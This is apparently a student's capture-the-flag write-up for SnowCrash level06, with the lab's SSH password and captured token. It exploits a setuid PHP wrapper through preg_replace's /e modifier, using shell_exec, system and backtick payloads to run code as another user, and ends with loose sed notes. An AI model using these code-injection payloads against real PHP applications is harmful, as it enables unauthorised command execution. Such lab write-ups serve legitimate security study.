ssh level06@10.12.100.98 -p 4242
password: viuaaale9huek52boumoomioc

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

using strings to inspect the binary
```
level06@SnowCrash:~$ strings level06

/usr/bin/php
/home/user/level06/level06.php
```

level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty

the binary uses a php script, it takes two arguments, but uses only the first as a file name and reads from it.

level06@SnowCrash:~$ echo "aaa" > /tmp/output
level06@SnowCrash:~$ ./level06 /tmp/output
aaa

level06@SnowCrash:~$ echo "ls" > /tmp/output
level06@SnowCrash:~$ ./level06 /tmp/output
ls

level06@SnowCrash:~$ echo "$(ls)" > /tmp/output
level06@SnowCrash:~$ ./level06 /tmp/output
level06
level06.php

so find a why to inject getflag, so we should understand the regex thing to reverse the process...

note: use https://regexr.com/ 

```

<?php

function y($m) 
{ 
    $m = preg_replace("/\./", " x ", $m); // replace . with x
    $m = preg_replace("/@/", " y", $m); // replace @ with y
     return $m; 
}
function x($y, $z)
{
    $a = file_get_contents($y);                             // preg_replace(patterns, replacements, input)
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // matches a [ x space ( string ) ]
    $a = preg_replace("/\[/", "(", $a);                     // replace [ with (
    $a = preg_replace("/\]/", ")", $a);                     // replace ]  with )
    
    return $a;
}

$r = x($argv[1], $argv[2]);

print $r;

?>

```

so we adapt our command to matche the pattern: [ x space ( command ) ]



 we copied the php script to the host machine in order to format it and clearly read it and test it.

copy the php script to another machine and run it
```
PHP Warning:  preg_replace(): The /e modifier is no longer supported,
use preg_replace_callback instead in level06.php on line 12
```

So we search about the The /e modifier in google and we found out that it's deprecated because it contains a vulnerability,
now we just need to exploit it, we used shell_exec php function that execute shell commands
and use the return as variable so php would throw an error with the return.

```
level06@SnowCrash:~$ echo "[x \${\${shell_exec(getflag)}}]" > /tmp/getflag06
level06@SnowCrash:~$ ./level06 /tmp/getflag06
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1
```




The preg_replace() function returns a string or array of strings where all matches of a pattern
 or list of patterns found in the input are replaced with substrings.

```
<?php
$str = 'this is 42';
$pattern = '/42/i';
echo preg_replace($pattern, '1337', $str);
?>
```

google: preg_replace /e exploit

The /e modifier allows a second argument to be evaluated as a PHP expression.
https://stackoverflow.com/questions/33093133/exploiting-preg-replace-e-modifier-in-php


Exploiting the code:
To exploit the code, all the attacker has to do is provide some PHP code to execute, 
generate a regular expression which replaces some or all of the string with the code, and set the `e` modifier on the regular expression/pattern

Based on the example above, the attacker can execute the id shell command using the system() function in PHP.
https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4

echo '[x {${system(getflag)}}]' > /tmp/output

echo '[x {${}}]' > /tmp/output
https://www.php.net/manual/en/language.types.string.php


echo '[x ${`getflag`}]' > /tmp/test2
echo '[x ${(`getflag`)}]' > /tmp/a
echo '[x {${(`getflag`)}}]' > /tmp/test1

➜   echo foo8www |sed 's/\(.*\)8\(.*\)/=\2/' 
=www
➜   echo foo8www |sed 's/\(.*\)8\(.*\)/\2/'  
www
➜   echo foo8www |sed 's#\(.*\)8\(.*\)#\2#' 

echo "123.456.78" |sed 's/\([0-9]*\)\.\([0-9]*\)\.\([0-9]*\)/\2/'







